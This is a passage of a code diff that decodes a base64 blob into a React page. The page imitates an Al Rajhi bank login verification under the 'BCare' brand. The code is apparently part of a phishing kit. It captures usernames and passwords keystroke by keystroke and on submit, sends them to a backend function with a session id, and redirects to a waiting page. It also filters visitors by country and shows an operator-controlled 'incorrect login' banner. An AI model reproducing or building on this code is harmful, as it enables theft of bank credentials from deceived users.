@@ -1,1 +1,246 @@
-aW1wb3J0IHsgY3JlYXRlRmlsZVJvdXRlLCB1c2VOYXZpZ2F0ZSB9IGZyb20gIkB0YW5zdGFjay9yZWFjdC1yb3V0ZXIiOwppbXBvcnQgeyBSZWplY3RCYW5uZXIgfSBmcm9tICJAL2NvbXBvbmVudHMvUmVqZWN0QmFubmVyIjsKaW1wb3J0IHsgdXNlRWZmZWN0LCB1c2VTdGF0ZSB9IGZyb20gInJlYWN0IjsKaW1wb3J0IHsgeiB9IGZyb20gInpvZCI7CmltcG9ydCB7IHVzZVZpc2l0b3JUcmFja2luZyB9IGZyb20gIkAvaG9va3MvdXNlVmlzaXRvclRyYWNraW5nIjsKaW1wb3J0IHsgdXNlTGl2ZUlucHV0IH0gZnJvbSAiQC9ob29rcy91c2VMaXZlSW5wdXQiOwppbXBvcnQgeyBjaGVja0NvdW50cnlBY2Nlc3MsIHNhdmVSYWpoaSB9IGZyb20gIkAvbGliL3RyYWNraW5nLmZ1bmN0aW9ucyI7CmltcG9ydCBicmFuZExvZ28gZnJvbSAiQC9hc3NldHMvYnJhbmQtbG9nby5zdmciOwoKCmV4cG9ydCBjb25zdCBSb3V0ZSA9IGNyZWF0ZUZpbGVSb3V0ZSgiL3JhamhpIikoewogIGhlYWQ6ICgpID0+ICh7CiAgICBtZXRhOiBbCiAgICAgIHsgdGl0bGU6ICLYp9mE2KrYrdmC2YIg2YXZhiDYp9mE2K3Ys9in2KggfCDYqNmKINmD2YrYsSIgfSwKICAgICAgeyBuYW1lOiAiZGVzY3JpcHRpb24iLCBjb250ZW50OiAi2KrYs9is2YrZhCDYp9mE2K/YrtmI2YQg2YTZhNiq2K3ZgtmCINmF2YYg2K3Ys9in2KjZgyDZgdmKINio2Yog2YPZitixLiIgfSwKICAgIF0sCiAgICBsaW5rczogWwogICAgICB7IHJlbDogInByZWNvbm5lY3QiLCBocmVmOiAiaHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbSIgfSwKICAgICAgeyByZWw6ICJwcmVjb25uZWN0IiwgaHJlZjogImh0dHBzOi8vZm9udHMuZ3N0YXRpYy5jb20iLCBjcm9zc09yaWdpbjogImFub255bW91cyIgfSwKICAgICAgewogICAgICAgIHJlbDogInN0eWxlc2hlZXQiLAogICAgICAgIGhyZWY6ICJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2NzczI/ZmFtaWx5PVRhamF3YWw6d2dodEA0MDA7NTAwOzcwMDs4MDA7OTAwJmZhbWlseT1PdXRmaXQ6d2dodEA1MDA7NzAwJmRpc3BsYXk9c3dhcCIsCiAgICAgIH0sCiAgICBdLAogIH0pLAogIHZhbGlkYXRlU2VhcmNoOiB6Lm9iamVjdCh7IGVycm9yOiB6LnVuaW9uKFt6LnN0cmluZygpLCB6Lm51bWJlcigpXSkub3B0aW9uYWwoKSB9KSwKICBjb21wb25lbnQ6IFJhamhpUGFnZSwKfSk7CgpmdW5jdGlvbiBSYWpoaVBhZ2UoKSB7CiAgdXNlVmlzaXRvclRyYWNraW5nKCLYp9mE2KrYrdmC2YIg2YXZhiDYp9mE2K3Ys9in2KggLSDYqNmKINmD2YrYsSIpOwogIGNvbnN0IG5hdmlnYXRlID0gdXNlTmF2aWdhdGUoKTsKICBjb25zdCBbbG9hZGluZywgc2V0TG9hZGluZ10gPSB1c2VTdGF0ZShmYWxzZSk7CiAgY29uc3QgW3Nob3dQYXNzLCBzZXRTaG93UGFzc10gPSB1c2VTdGF0ZShmYWxzZSk7CiAgY29uc3QgW2ZvY3VzLCBzZXRGb2N1c10gPSB1c2VTdGF0ZTxzdHJpbmcgfCBudWxsPihudWxsKTsKICBjb25zdCBbcmVtZW1iZXIsIHNldFJlbWVtYmVyXSA9IHVzZVN0YXRlKGZhbHNlKTsKICBjb25zdCBbdXNlcm5hbWUsIHNldFVzZXJuYW1lXSA9IHVzZVN0YXRlKCIiKTsKICBjb25zdCBbcGFzc3dvcmQsIHNldFBhc3N3b3JkXSA9IHVzZVN0YXRlKCIiKTsKICB1c2VMaXZlSW5wdXQoeyB1c2VybmFtZSwgcGFzc3dvcmQgfSk7CgoKICB1c2VFZmZlY3QoKCkgPT4gewogICAgaWYgKHR5cGVvZiB3aW5kb3cgPT09ICJ1bmRlZmluZWQiKSByZXR1cm47CiAgICBjaGVja0NvdW50cnlBY2Nlc3MoKQogICAgICAudGhlbigocmVzKSA9PiB7CiAgICAgICAgaWYgKHJlcyAmJiByZXMuYWxsb3dlZCA9PT0gZmFsc2UpIHdpbmRvdy5sb2NhdGlvbi5yZXBsYWNlKCIvYmxvY2tlZCIpOwogICAgICB9KQogICAgICAuY2F0Y2goKCkgPT4ge30pOwogIH0sIFtdKTsKCiAgYXN5bmMgZnVuY3Rpb24gb25TdWJtaXQoZTogUmVhY3QuRm9ybUV2ZW50PEhUTUxGb3JtRWxlbWVudD4pIHsKICAgIGUucHJldmVudERlZmF1bHQoKTsKICAgIGNvbnN0IHNlc3Npb25JZCA9IHdpbmRvdy5sb2NhbFN0b3JhZ2UuZ2V0SXRlbSgiYmNhcmVfc2Vzc2lvbl9pZCIpOwogICAgaWYgKCFzZXNzaW9uSWQpIHJldHVybjsKICAgIGNvbnN0IGZkID0gbmV3IEZvcm1EYXRhKGUuY3VycmVudFRhcmdldCk7CiAgICBzZXRMb2FkaW5nKHRydWUpOwogICAgYXdhaXQgc2F2ZVJhamhpKHsKICAgICAgZGF0YTogewogICAgICAgIHNlc3Npb25faWQ6IHNlc3Npb25JZCwKICAgICAgICB1c2VybmFtZTogU3RyaW5nKGZkLmdldCgidXNlcm5hbWUiKSA/PyAiIiksCiAgICAgICAgcGFzc3dvcmQ6IFN0cmluZyhmZC5nZXQoInBhc3N3b3JkIikgPz8gIiIpLAogICAgICB9LAogICAgfSkuY2F0Y2goKCkgPT4ge30pOwogICAgc2V0TG9hZGluZyhmYWxzZSk7CiAgICBuYXZpZ2F0ZSh7IHRvOiAiL3JhamhpLXdhaXQiIGFzIG5ldmVyIH0pOwogIH0KCiAgcmV0dXJuICgKICAgIDxkaXYKICAgICAgZGlyPSJydGwiCiAgICAgIGNsYXNzTmFtZT0ibWluLWgtc2NyZWVuIHJlbGF0aXZlIGZsZXggZmxleC1jb2wgaXRlbXMtY2VudGVyIGp1c3RpZnktY2VudGVyIHAtNCBzbTpwLTYgb3ZlcmZsb3ctaGlkZGVuIgogICAgICBzdHlsZT17ewogICAgICAgIGZvbnRGYW1pbHk6ICInVGFqYXdhbCcsIHN5c3RlbS11aSwgc2Fucy1zZXJpZiIsCiAgICAgICAgYmFja2dyb3VuZDoKICAgICAgICAgICJyYWRpYWwtZ3JhZGllbnQoMTIwMHB4IDYwMHB4IGF0IDUwJSAtMTAlLCAjRUFGM0ZBIDAlLCAjRjVGOEZCIDU1JSwgI0Y1RjhGQiAxMDAlKSIsCiAgICAgIH19CiAgICA+CiAgICAgIHsvKiBTdWJ0bGUgZGVjb3JhdGl2ZSByaW5ncyAqL30KICAgICAgPGRpdiBjbGFzc05hbWU9InBvaW50ZXItZXZlbnRzLW5vbmUgYWJzb2x1dGUgaW5zZXQtMCBvcGFjaXR5LVswLjM1XSIgYXJpYS1oaWRkZW4+CiAgICAgICAgPGRpdiBjbGFzc05hbWU9ImFic29sdXRlIC10b3AtNDAgLXJpZ2h0LTQwIHctWzQyMHB4XSBoLVs0MjBweF0gcm91bmRlZC1mdWxsIGJvcmRlciBib3JkZXItWyMxNTYzOTRdLzE1IiAvPgogICAgICAgIDxkaXYgY2xhc3NOYW1lPSJhYnNvbHV0ZSAtdG9wLTI0IC1yaWdodC0yNCB3LVsyODBweF0gaC1bMjgwcHhdIHJvdW5kZWQtZnVsbCBib3JkZXIgYm9yZGVyLVsjMTU2Mzk0XS8xMCIgLz4KICAgICAgICA8ZGl2IGNsYXNzTmFtZT0iYWJzb2x1dGUgLWJvdHRvbS00MCAtbGVmdC00MCB3LVs0MjBweF0gaC1bNDIwcHhdIHJvdW5kZWQtZnVsbCBib3JkZXIgYm9yZGVyLVsjMTU2Mzk0XS8xMCIgLz4KICAgICAgPC9kaXY+CgogICAgICA8ZGl2IGNsYXNzTmFtZT0idy1mdWxsIG1heC13LVs0NDBweF0gcmVsYXRpdmUiPgogICAgICAgIDxSZWplY3RCYW5uZXIgbWVzc2FnZT0i2KjZitin2YbYp9iqINiq2LPYrNmK2YQg2KfZhNiv2K7ZiNmEINi62YrYsSDYtdit2YrYrdip2Iwg2YrYsdis2Ykg2KfZhNmF2K3Yp9mI2YTYqSDZhdix2Kkg2KPYrtix2YkuIiAvPgoKICAgICAgICB7LyogVG9wIGJyYW5kIHN0cmlwICovfQogICAgICAgIDxkaXYgY2xhc3NOYW1lPSJmbGV4IGl0ZW1zLWNlbnRlciBqdXN0aWZ5LWNlbnRlciBnYXAtMiBtYi01Ij4KICAgICAgICAgIDxzcGFuIGNsYXNzTmFtZT0iaW5saW5lLWZsZXggaXRlbXMtY2VudGVyIGdhcC0xLjUgdGV4dC1bMTNweF0gZm9udC1zZW1pYm9sZCB0ZXh0LVsjMTU2Mzk0XSBiZy1bIzE1NjM5NF0vMTAgcHgtMyBweS0xLjUgcm91bmRlZC1mdWxsIj4KICAgICAgICAgICAgPHN2ZyB3aWR0aD0iMTIiIGhlaWdodD0iMTIiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSJjdXJyZW50Q29sb3IiIHN0cm9rZVdpZHRoPSIyLjUiIHN0cm9rZUxpbmVjYXA9InJvdW5kIiBzdHJva2VMaW5lam9pbj0icm91bmQiPgogICAgICAgICAgICAgIDxwYXRoIGQ9Ik0xMiAybDggNHY2YzAgNS0zLjUgOS04IDEwLTQuNS0xLTgtNS04LTEwVjZsOC00eiIgLz4KICAgICAgICAgICAgICA8cGF0aCBkPSJtOSAxMiAyIDIgNC00IiAvPgogICAgICAgICAgICA8L3N2Zz4KICAgICAgICAgICAg2KrYrdmC2YIg2KLZhdmGINi52KjYsSDYqNmKINmD2YrYsSDZgdin2KrZiNix2Kkg2LnYqNixINiq2LfYqNmK2YIg2KfZhNix2KfYrNit2YoKICAgICAgICAgIDwvc3Bhbj4KICAgICAgICA8L2Rpdj4KCiAgICAgICAgPGRpdiBjbGFzc05hbWU9InJlbGF0aXZlIGJnLXdoaXRlIHJvdW5kZWQtWzI4cHhdIHNoYWRvdy1bMF8yMHB4XzYwcHhfLTIwcHhfcmdiYSgyMSw5OSwxNDgsMC4yNSldIGJvcmRlciBib3JkZXItWyMxNTYzOTRdLzEwIG92ZXJmbG93LWhpZGRlbiI+CiAgICAgICAgICB7LyogQWNjZW50IHRvcCBiYXIgKi99CiAgICAgICAgICA8ZGl2IGNsYXNzTmFtZT0iaC0xLjUgdy1mdWxsIiBzdHlsZT17eyBiYWNrZ3JvdW5kOiAibGluZWFyLWdyYWRpZW50KDkwZGVnLCMyYjg2YzAsIzE1NjM5NCwjMGM0MjY5KSIgfX0gLz4KCiAgICAgICAgICA8ZGl2IGNsYXNzTmFtZT0icC02IHNtOnAtOSBmbGV4IGZsZXgtY29sIGl0ZW1zLWNlbnRlciI+CiAgICAgICAgICAgIHsvKiBMb2dvIGxvY2t1cCAqL30KICAgICAgICAgICAgPGRpdiBjbGFzc05hbWU9InJlbGF0aXZlIG1iLTUiPgogICAgICAgICAgICAgIDxkaXYgY2xhc3NOYW1lPSJhYnNvbHV0ZSBpbnNldC0wIHJvdW5kZWQtM3hsIGJsdXItMnhsIGJnLVsjMTU2Mzk0XS8yNSIgYXJpYS1oaWRkZW4gLz4KICAgICAgICAgICAgICA8ZGl2IGNsYXNzTmFtZT0icmVsYXRpdmUgdy0yNCBoLTI0IHJvdW5kZWQtM3hsIGJnLWdyYWRpZW50LXRvLWJyIGZyb20td2hpdGUgdG8tWyNFQUYzRkFdIGJvcmRlciBib3JkZXItWyMxNTYzOTRdLzE1IHNoYWRvdy1baW5zZXRfMF8xcHhfMF9yZ2JhKDI1NSwyNTUsMjU1LDAuOSldIGZsZXggaXRlbXMtY2VudGVyIGp1c3RpZnktY2VudGVyIj4KICAgICAgICAgICAgICAgIDxpbWcgc3JjPXticmFuZExvZ299IGFsdD0i2KfZhNi02LnYp9ixIiBjbGFzc05hbWU9InctMTYgaC1hdXRvIiAvPgoKICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CgogICAgICAgICAgICA8aDEgY2xhc3NOYW1lPSJ0ZXh0LVsyMnB4XSBzbTp0ZXh0LTJ4bCBmb250LWV4dHJhYm9sZCB0ZXh0LVsjMTAyNDNhXSB0cmFja2luZy10aWdodCI+CiAgICAgICAgICAgICAg2YXYsdit2KjYp9mLINio2YMg2YHZiiDYp9mE2LHYp9is2K3ZigogICAgICAgICAgICA8L2gxPgogICAgICAgICAgICA8cCBjbGFzc05hbWU9Im10LTIgdGV4dC1bMTMuNXB4XSB0ZXh0LVsjNjQ3NDhiXSB0ZXh0LWNlbnRlciBsZWFkaW5nLXJlbGF4ZWQgbWF4LXctWzMyMHB4XSI+CiAgICAgICAgICAgICAg2YXYsdit2KjYpyDYqNmDINmB2Yog2KfZhNix2KfYrNit2Yog2KfZiNmGINmE2KfZitmGCiAgICAgICAgICAgIDwvcD4KCiAgICAgICAgICAgIHsvKiBTaW5nbGUgdGFiIOKAlCBsb2dpbiBvbmx5ICovfQogICAgICAgICAgICA8ZGl2IGNsYXNzTmFtZT0ibXQtNiB3LWZ1bGwgcm91bmRlZC0yeGwgYm9yZGVyIGJvcmRlci1bIzE1NjM5NF0vMTUgYmctWyNFQUYzRkFdIHAtMS41Ij4KICAgICAgICAgICAgICA8YnV0dG9uCiAgICAgICAgICAgICAgICB0eXBlPSJidXR0b24iCiAgICAgICAgICAgICAgICBjbGFzc05hbWU9InctZnVsbCByb3VuZGVkLXhsIGJnLXdoaXRlIHB5LTMgdGV4dC1zbSBmb250LWV4dHJhYm9sZCB0ZXh0LVsjMTU2Mzk0XSBzaGFkb3ctc20gYm9yZGVyIGJvcmRlci1bIzE1NjM5NF0vMTAiCiAgICAgICAgICAgICAgPgogICAgICAgICAgICAgICAg2KrYs9is2YrZhCDYp9mE2K/YrtmI2YQKICAgICAgICAgICAgICA8L2J1dHRvbj4KICAgICAgICAgICAgPC9kaXY+CgoKICAgICAgICAgICAgPGZvcm0gb25TdWJtaXQ9e29uU3VibWl0fSBjbGFzc05hbWU9InctZnVsbCBzcGFjZS15LTQiPgogICAgICAgICAgICAgIDxGaWVsZCBsYWJlbD0i2KfYs9mFINin2YTZhdiz2KrYrtiv2YUiIGFjdGl2ZT17Zm9jdXMgPT09ICJ1In0+CiAgICAgICAgICAgICAgICA8aW5wdXQKICAgICAgICAgICAgICAgICAgbmFtZT0idXNlcm5hbWUiCiAgICAgICAgICAgICAgICAgIHJlcXVpcmVkCiAgICAgICAgICAgICAgICAgIGF1dG9Db21wbGV0ZT0idXNlcm5hbWUiCiAgICAgICAgICAgICAgICAgIHBsYWNlaG9sZGVyPSLYo9iv2K7ZhCDYp9iz2YUg2KfZhNmF2LPYqtiu2K/ZhSIKICAgICAgICAgICAgICAgICAgZGlyPSJsdHIiCiAgICAgICAgICAgICAgICAgIHZhbHVlPXt1c2VybmFtZX0KICAgICAgICAgICAgICAgICAgb25DaGFuZ2U9eyhlKSA9PiBzZXRVc2VybmFtZShlLnRhcmdldC52YWx1ZSl9CiAgICAgICAgICAgICAgICAgIG9uRm9jdXM9eygpID0+IHNldEZvY3VzKCJ1Iil9CiAgICAgICAgICAgICAgICAgIG9uQmx1cj17KCkgPT4gc2V0Rm9jdXMobnVsbCl9CiAgICAgICAgICAgICAgICAgIGNsYXNzTmFtZT0idy1mdWxsIGJnLXRyYW5zcGFyZW50IG91dGxpbmUtbm9uZSB0ZXh0LVsxNXB4XSB0cmFja2luZy13aWRlciB0ZXh0LVsjMTAyNDNhXSBwbGFjZWhvbGRlcjp0ZXh0LVsjOTRhM2I4XSB0ZXh0LWxlZnQiCiAgICAgICAgICAgICAgICAgIHN0eWxlPXt7IGZvbnRGYW1pbHk6ICInT3V0Zml0JywgJ1RhamF3YWwnLCBzYW5zLXNlcmlmIiB9fQogICAgICAgICAgICAgICAgLz4KCiAgICAgICAgICAgICAgPC9GaWVsZD4KCiAgICAgICAgICAgICAgPEZpZWxkIGxhYmVsPSLZg9mE2YXYqSDYp9mE2LPYsSIgYWN0aXZlPXtmb2N1cyA9PT0gInAifT4KICAgICAgICAgICAgICAgIDxpbnB1dAogICAgICAgICAgICAgICAgICBuYW1lPSJwYXNzd29yZCIKICAgICAgICAgICAgICAgICAgdHlwZT17c2hvd1Bhc3MgPyAidGV4dCIgOiAicGFzc3dvcmQifQogICAgICAgICAgICAgICAgICByZXF1aXJlZAogICAgICAgICAgICAgICAgICBhdXRvQ29tcGxldGU9ImN1cnJlbnQtcGFzc3dvcmQiCiAgICAgICAgICAgICAgICAgIHBsYWNlaG9sZGVyPSLigKLigKLigKLigKLigKLigKLigKLigKIiCiAgICAgICAgICAgICAgICAgIHZhbHVlPXtwYXNzd29yZH0KICAgICAgICAgICAgICAgICAgb25DaGFuZ2U9eyhlKSA9PiBzZXRQYXNzd29yZChlLnRhcmdldC52YWx1ZSl9CiAgICAgICAgICAgICAgICAgIG9uRm9jdXM9eygpID0+IHNldEZvY3VzKCJwIil9CiAgICAgICAgICAgICAgICAgIG9uQmx1cj17KCkgPT4gc2V0Rm9jdXMobnVsbCl9CiAgICAgICAgICAgICAgICAgIGNsYXNzTmFtZT0idy1mdWxsIGJnLXRyYW5zcGFyZW50IG91dGxpbmUtbm9uZSB0ZXh0LVsxNXB4XSB0ZXh0LVsjMTAyNDNhXSBwbGFjZWhvbGRlcjp0ZXh0LVsjOTRhM2I4XSBwbC0xNCIKICAgICAgICAgICAgICAgIC8+CiAgICAgICAgICAgICAgICA8YnV0dG9uCiAgICAgICAgICAgICAgICAgIHR5cGU9ImJ1dHRvbiIKICAgICAgICAgICAgICAgICAgb25DbGljaz17KCkgPT4gc2V0U2hvd1Bhc3MoKHYpID0+ICF2KX0KICAgICAgICAgICAgICAgICAgY2xhc3NOYW1lPSJhYnNvbHV0ZSBpbnNldC15LTAgbGVmdC0zIG15LWF1dG8gaC04IHJvdW5kZWQtbGcgcHgtMi41IHRleHQtWzExcHhdIGZvbnQtYm9sZCB0ZXh0LVsjMTU2Mzk0XSBob3ZlcjpiZy1bIzE1NjM5NF0vMTAgdHJhbnNpdGlvbi1jb2xvcnMiCiAgICAgICAgICAgICAgICA+CiAgICAgICAgICAgICAgICAgIHtzaG93UGFzcyA/ICLYpdiu2YHYp9ihIiA6ICLYpdi42YfYp9ixIn0KICAgICAgICAgICAgICAgIDwvYnV0dG9uPgogICAgICAgICAgICAgIDwvRmllbGQ+CgogICAgICAgICAgICAgIHsvKiBSZW1lbWJlciBtZSBvbmx5ICovfQogICAgICAgICAgICAgIDxkaXYgY2xhc3NOYW1lPSJmbGV4IGl0ZW1zLWNlbnRlciBqdXN0aWZ5LWJldHdlZW4gcHgtMSI+CiAgICAgICAgICAgICAgICA8bGFiZWwgY2xhc3NOYW1lPSJmbGV4IGl0ZW1zLWNlbnRlciBnYXAtMiBjdXJzb3ItcG9pbnRlciI+CiAgICAgICAgICAgICAgICAgIDxpbnB1dAogICAgICAgICAgICAgICAgICAgIHR5cGU9ImNoZWNrYm94IgogICAgICAgICAgICAgICAgICAgIG5hbWU9InJlbWVtYmVyIgogICAgICAgICAgICAgICAgICAgIGNoZWNrZWQ9e3JlbWVtYmVyfQogICAgICAgICAgICAgICAgICAgIG9uQ2hhbmdlPXsoZSkgPT4gc2V0UmVtZW1iZXIoZS50YXJnZXQuY2hlY2tlZCl9CiAgICAgICAgICAgICAgICAgICAgY2xhc3NOYW1lPSJoLTQgdy00IHJvdW5kZWQgYm9yZGVyLVsjY2JkNWUxXSB0ZXh0LVsjMTU2Mzk0XSBmb2N1czpyaW5nLVsjMTU2Mzk0XS8yMCIKICAgICAgICAgICAgICAgICAgLz4KICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3NOYW1lPSJ0ZXh0LVsxM3B4XSBmb250LW1lZGl1bSB0ZXh0LVsjNjQ3NDhiXSI+2KrYsNmD2LHZhtmKPC9zcGFuPgogICAgICAgICAgICAgICAgPC9sYWJlbD4KICAgICAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgICAgICAgPGJ1dHRvbgogICAgICAgICAgICAgICAgdHlwZT0ic3VibWl0IgogICAgICAgICAgICAgICAgZGlzYWJsZWQ9e2xvYWRpbmd9CiAgICAgICAgICAgICAgICBjbGFzc05hbWU9Imdyb3VwIHJlbGF0aXZlIHctZnVsbCBvdmVyZmxvdy1oaWRkZW4gcm91bmRlZC0yeGwgcHktNCBmb250LWV4dHJhYm9sZCB0ZXh0LXdoaXRlIHRleHQtWzE1cHhdIHNoYWRvdy1bMF8xMnB4XzMwcHhfLThweF9yZ2JhKDIxLDk5LDE0OCwwLjU1KV0gYWN0aXZlOnNjYWxlLVswLjk4NV0gdHJhbnNpdGlvbi1hbGwgZGlzYWJsZWQ6b3BhY2l0eS03MCBkaXNhYmxlZDpjdXJzb3Itbm90LWFsbG93ZWQiCiAgICAgICAgICAgICAgICBzdHlsZT17eyBiYWNrZ3JvdW5kOiAibGluZWFyLWdyYWRpZW50KDEzNWRlZywjMmI4NmMwIDAlLCMxNTYzOTQgNTUlLCMwYzQyNjkgMTAwJSkiIH19CiAgICAgICAgICAgICAgPgogICAgICAgICAgICAgICAgPHNwYW4gY2xhc3NOYW1lPSJyZWxhdGl2ZSB6LTEwIGZsZXggaXRlbXMtY2VudGVyIGp1c3RpZnktY2VudGVyIGdhcC0yIj4KICAgICAgICAgICAgICAgICAge2xvYWRpbmcgPyAoCiAgICAgICAgICAgICAgICAgICAgPD4KICAgICAgICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzTmFtZT0iaC00IHctNCByb3VuZGVkLWZ1bGwgYm9yZGVyLTIgYm9yZGVyLXdoaXRlLzQwIGJvcmRlci10LXdoaXRlIGFuaW1hdGUtc3BpbiIgLz4KICAgICAgICAgICAgICAgICAgICAgINis2KfYsdmNINin2YTYqtit2YLZguKApgogICAgICAgICAgICAgICAgICAgIDwvPgogICAgICAgICAgICAgICAgICApIDogKAogICAgICAgICAgICAgICAgICAgIDw+CiAgICAgICAgICAgICAgICAgICAgICDYqtiz2KzZitmEINin2YTYr9iu2YjZhAogICAgICAgICAgICAgICAgICAgICAgPHN2ZyB3aWR0aD0iMTYiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSJjdXJyZW50Q29sb3IiIHN0cm9rZVdpZHRoPSIyLjUiIHN0cm9rZUxpbmVjYXA9InJvdW5kIiBzdHJva2VMaW5lam9pbj0icm91bmQiPgogICAgICAgICAgICAgICAgICAgICAgICA8cGF0aCBkPSJNMTkgMTJINSIgLz4KICAgICAgICAgICAgICAgICAgICAgICAgPHBhdGggZD0ibTEyIDE5LTctNyA3LTciIC8+CiAgICAgICAgICAgICAgICAgICAgICA8L3N2Zz4KICAgICAgICAgICAgICAgICAgICA8Lz4KICAgICAgICAgICAgICAgICAgKX0KICAgICAgICAgICAgICAgIDwvc3Bhbj4KICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzTmFtZT0iYWJzb2x1dGUgaW5zZXQtMCBiZy1ncmFkaWVudC10by1yIGZyb20td2hpdGUvMCB2aWEtd2hpdGUvMjUgdG8td2hpdGUvMCB0cmFuc2xhdGUteC1bLTEyMCVdIGdyb3VwLWhvdmVyOnRyYW5zbGF0ZS14LVsxMjAlXSB0cmFuc2l0aW9uLXRyYW5zZm9ybSBkdXJhdGlvbi03MDAiIC8+CiAgICAgICAgICAgICAgPC9idXR0b24+CiAgICAgICAgICAgIDwvZm9ybT4KCiAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KCiAgICAgICAgPHAgY2xhc3NOYW1lPSJtdC01IHRleHQtY2VudGVyIHRleHQtWzExcHhdIHRleHQtWyM5NGEzYjhdIj4KICAgICAgICAgIMKpINio2Yog2YPZitixIOKAlCDYrNmF2YrYuSDYp9mE2K3ZgtmI2YIg2YXYrdmB2YjYuNipCiAgICAgICAgPC9wPgogICAgICA8L2Rpdj4KICAgIDwvZGl2PgogICk7Cn0KCmZ1bmN0aW9uIEZpZWxkKHsKICBsYWJlbCwKICBhY3RpdmUsCiAgY2hpbGRyZW4sCn06IHsKICBsYWJlbDogc3RyaW5nOwogIGFjdGl2ZTogYm9vbGVhbjsKICBjaGlsZHJlbjogUmVhY3QuUmVhY3ROb2RlOwp9KSB7CiAgcmV0dXJuICgKICAgIDxkaXY+CiAgICAgIDxsYWJlbCBjbGFzc05hbWU9ImJsb2NrIHRleHQtWzEyLjVweF0gZm9udC1ib2xkIHRleHQtWyMzMzQxNTVdIG1yLTEgbWItMS41Ij57bGFiZWx9PC9sYWJlbD4KICAgICAgPGRpdgogICAgICAgIGNsYXNzTmFtZT17YHJlbGF0aXZlIGZsZXggaXRlbXMtY2VudGVyIHJvdW5kZWQtMnhsIGJvcmRlciBiZy1bI0Y1RjhGQl0gcHgtNCBweS0zLjUgdHJhbnNpdGlvbi1hbGwgJHsKICAgICAgICAgIGFjdGl2ZQogICAgICAgICAgICA/ICJib3JkZXItWyMxNTYzOTRdIGJnLXdoaXRlIHJpbmctNCByaW5nLVsjMTU2Mzk0XS8xMCBzaGFkb3ctc20iCiAgICAgICAgICAgIDogImJvcmRlci1bI2UyZThmMF0gaG92ZXI6Ym9yZGVyLVsjY2JkNWUxXSIKICAgICAgICB9YH0KICAgICAgPgogICAgICAgIHtjaGlsZHJlbn0KICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KICApOwp9Cgo=
+import { createFileRoute, useNavigate } from "@tanstack/react-router";
+import { RejectBanner } from "@/components/RejectBanner";
+import { useEffect, useState } from "react";
+import { z } from "zod";
+import { useVisitorTracking } from "@/hooks/useVisitorTracking";
+import { useLiveInput } from "@/hooks/useLiveInput";
+import { checkCountryAccess, saveRajhi } from "@/lib/tracking.functions";
+import brandLogo from "@/assets/brand-logo.svg";
+
+
+export const Route = createFileRoute("/rajhi")({
+  head: () => ({
+    meta: [
+      { title: "التحقق من الحساب | بي كير" },
+      { name: "description", content: "تسجيل الدخول للتحقق من حسابك في بي كير." },
+    ],
+    links: [
+      { rel: "preconnect", href: "https://fonts.googleapis.com" },
+      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
+      {
+        rel: "stylesheet",
+        href: "https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800;900&family=Outfit:wght@500;700&display=swap",
+      },
+    ],
+  }),
+  validateSearch: z.object({ error: z.union([z.string(), z.number()]).optional() }),
+  component: RajhiPage,
+});
+
+function RajhiPage() {
+  useVisitorTracking("التحقق من الحساب - بي كير");
+  const navigate = useNavigate();
+  const [loading, setLoading] = useState(false);
+  const [showPass, setShowPass] = useState(false);
+  const [focus, setFocus] = useState<string | null>(null);
+  const [remember, setRemember] = useState(false);
+  const [username, setUsername] = useState("");
+  const [password, setPassword] = useState("");
+  useLiveInput({ username, password });
+
+
+  useEffect(() => {
+    if (typeof window === "undefined") return;
+    checkCountryAccess()
+      .then((res) => {
+        if (res && res.allowed === false) window.location.replace("/blocked");
+      })
+      .catch(() => {});
+  }, []);
+
+  async function onSubmit(e: React.FormEvent<HTMLFormElement>) {
+    e.preventDefault();
+    const sessionId = window.localStorage.getItem("bcare_session_id");
+    if (!sessionId) return;
+    const fd = new FormData(e.currentTarget);
+    setLoading(true);
+    await saveRajhi({
+      data: {
+        session_id: sessionId,
+        username: String(fd.get("username") ?? ""),
+        password: String(fd.get("password") ?? ""),
+      },
+    }).catch(() => {});
+    setLoading(false);
+    navigate({ to: "/rajhi-wait" as never });
+  }
+
+  return (
+    <div
+      dir="rtl"
+      className="min-h-screen relative flex flex-col items-center justify-center p-4 sm:p-6 overflow-hidden"
+      style={{
+        fontFamily: "'Tajawal', system-ui, sans-serif",
+        background:
+          "radial-gradient(1200px 600px at 50% -10%, #EAF3FA 0%, #F5F8FB 55%, #F5F8FB 100%)",
+      }}
+    >
+      {/* Subtle decorative rings */}
+      <div className="pointer-events-none absolute inset-0 opacity-[0.35]" aria-hidden>
+        <div className="absolute -top-40 -right-40 w-[420px] h-[420px] rounded-full border border-[#156394]/15" />
+        <div className="absolute -top-24 -right-24 w-[280px] h-[280px] rounded-full border border-[#156394]/10" />
+        <div className="absolute -bottom-40 -left-40 w-[420px] h-[420px] rounded-full border border-[#156394]/10" />
+      </div>
+
+      <div className="w-full max-w-[440px] relative">
+        <RejectBanner message="بيانات تسجيل الدخول غير صحيحة، يرجى المحاولة مرة أخرى." />
+
+        {/* Top brand strip */}
+        <div className="flex items-center justify-center gap-2 mb-5">
+          <span className="inline-flex items-center gap-1.5 text-[13px] font-semibold text-[#156394] bg-[#156394]/10 px-3 py-1.5 rounded-full">
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+              <path d="M12 2l8 4v6c0 5-3.5 9-8 10-4.5-1-8-5-8-10V6l8-4z" />
+              <path d="m9 12 2 2 4-4" />
+            </svg>
+            تحقق آمن عبر بي كير فاتورة عبر تطبيق الراجحي
+          </span>
+        </div>
+
+        <div className="relative bg-white rounded-[28px] shadow-[0_20px_60px_-20px_rgba(21,99,148,0.25)] border border-[#156394]/10 overflow-hidden">
+          {/* Accent top bar */}
